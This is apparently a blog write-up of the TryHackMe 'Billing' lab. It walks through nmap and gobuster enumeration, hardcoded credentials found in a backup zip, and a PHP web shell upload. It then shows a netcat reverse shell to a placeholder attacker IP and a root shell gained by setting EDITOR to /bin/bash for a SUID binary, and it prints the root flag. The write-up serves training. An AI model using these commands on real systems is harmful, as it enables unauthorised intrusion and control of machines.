---
layout: post
title: "TryHackMe Billing Writeup"
date: 2025-04-20 10:00:00 +0000
categories: [CTF, TryHackMe]
tags: [tryhackme, billing, walkthrough, hacking, ctf]
image:
  path: /assets/img/billing.png
  alt: "Billing Machine"
---

## Overview

**Billing** is a TryHackMe machine focused on enumeration, web exploitation, and privilege escalation.

- Difficulty: Easy
- IP Address: `10.10.123.123`
- Creator: RunasRs

## Enumeration

We start with a basic Nmap scan:

```bash
nmap -sC -sV -oA billing 10.10.123.123
```

Results:
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Browsing to the IP reveals a login page for a billing system.

## Web Fuzzing

Using `gobuster` to find hidden directories:

```bash
gobuster dir -u http://10.10.123.123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

Found `/admin.php` and `/backup.zip`.

### Downloading the ZIP

```bash
wget http://10.10.123.123/backup.zip
unzip backup.zip
```

Inside, we find PHP source code with hardcoded credentials:

```php
$username = "admin";
$password = "BillingPass123";
```

## Getting a Shell

Login to `/admin.php` with the above credentials. It has a file upload option.

Upload a PHP reverse shell:

```php
<?php system($_GET['cmd']); ?>
```

Access it:

```
http://10.10.123.123/uploads/shell.php?cmd=nc -e /bin/bash YOUR_IP 4444
```

Set up a listener:

```bash
nc -lvnp 4444
```

## Privilege Escalation

Enumerate with `linpeas.sh`. Found a binary with SUID bit set: `/usr/bin/billingsystem`

Running it shows an option to view logs, editable via `$EDITOR` env variable.

```bash
export EDITOR="/bin/bash"
/usr/bin/billingsystem
```

Select the log view option and get a root shell.

## Root Flag

```bash
cat /root/root.txt
```

Flag: `THM{pr1v1l3g3_3sc4l4t10n_succ3ss}`

---

Thanks for reading!

